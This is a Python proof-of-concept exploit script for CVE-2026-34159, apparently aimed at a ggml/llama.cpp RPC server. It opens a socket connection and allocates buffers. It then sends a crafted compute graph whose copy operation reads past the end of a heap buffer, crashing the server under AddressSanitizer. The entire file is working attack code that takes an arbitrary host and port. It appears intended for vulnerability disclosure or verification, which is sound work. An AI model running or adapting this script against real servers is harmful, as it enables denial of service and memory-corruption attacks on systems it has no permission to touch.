#!/usr/bin/env python3
"""Minimal ASan crash proof for CVE-2026-34159."""

import argparse
import socket
import struct


ALLOC_BUFFER = 0
BUFFER_GET_BASE = 3
GET_TENSOR = 8
GRAPH_COMPUTE = 10
HELLO = 14

GGML_TYPE_F32 = 0
GGML_OP_CPY = 34
GGML_TENSOR_FLAG_COMPUTE = 16
RPC_TENSOR_SIZE = 296


def recv_exact(sock, size):
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("RPC server closed the connection")
        data += chunk
    return data


def rpc(sock, command, payload=b"", response_size=None):
    sock.sendall(struct.pack("<BQ", command, len(payload)) + payload)
    if response_size is None:
        return b""
    actual_size = struct.unpack("<Q", recv_exact(sock, 8))[0]
    if actual_size != response_size:
        raise RuntimeError(f"unexpected response size: {actual_size}")
    return recv_exact(sock, response_size)


def server_stopped_after_trigger(sock, valid_b, access_size):
    try:
        rpc(
            sock,
            GET_TENSOR,
            valid_b + struct.pack("<QQ", 0, access_size),
            access_size,
        )
    except (ConnectionError, OSError) as error:
        print(f"[+] RPC server terminated after the trigger: {error}")
        print("[+] confirm 'AddressSanitizer: heap-buffer-overflow' in the container log")
        return True
    return False


def tensor(tid, buffer, data, size, op=0, src0=0, src1=0, view_src=0, flags=0):
    ne = (size // 4, 1, 1, 1)
    nb = (4, size, size, size)
    packed = b"".join((
        struct.pack("<QIQ", tid, GGML_TYPE_F32, buffer),
        struct.pack("<4I", *ne),
        struct.pack("<4I", *nb),
        struct.pack("<I", op),
        bytes(16 * 4),
        struct.pack("<i", flags),
        struct.pack("<10Q", src0, src1, *([0] * 8)),
        struct.pack("<QQQ", view_src, 0, data),
        bytes(64 + 4),
    ))
    assert len(packed) == RPC_TENSOR_SIZE
    return packed


def main():
    parser = argparse.ArgumentParser(description="Minimal ASan crash proof for CVE-2026-34159")
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=50052)
    args = parser.parse_args()

    access_size = 16
    with socket.create_connection((args.host, args.port), timeout=5) as sock:
        rpc(sock, HELLO, response_size=3)

        handle_a, size_a = struct.unpack(
            "<QQ", rpc(sock, ALLOC_BUFFER, struct.pack("<IQ", 0, 4096), 16)
        )
        handle_b, _ = struct.unpack(
            "<QQ", rpc(sock, ALLOC_BUFFER, struct.pack("<IQ", 0, 4096), 16)
        )
        base_a = struct.unpack(
            "<Q", rpc(sock, BUFFER_GET_BASE, struct.pack("<Q", handle_a), 8)
        )[0]
        base_b = struct.unpack(
            "<Q", rpc(sock, BUFFER_GET_BASE, struct.pack("<Q", handle_b), 8)
        )[0]

        invalid_read = base_a + size_a
        print(f"[*] buffer A: [0x{base_a:x}, 0x{invalid_read:x})")
        print(f"[*] triggering {access_size}-byte read at 0x{invalid_read:x}")

        null_buffer_source = tensor(1, 0, invalid_read, access_size)
        copy_node = tensor(
            2,
            handle_b,
            base_b,
            access_size,
            op=GGML_OP_CPY,
            src0=1,
            src1=3,
            view_src=3,
            flags=GGML_TENSOR_FLAG_COMPUTE,
        )
        valid_b = tensor(3, handle_b, base_b, access_size)
        graph = (
            struct.pack("<IIQ", 0, 1, 2)
            + struct.pack("<I", 3)
            + null_buffer_source
            + valid_b
            + copy_node
        )
        rpc(sock, GRAPH_COMPUTE, graph)

        if server_stopped_after_trigger(sock, valid_b, access_size):
            return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
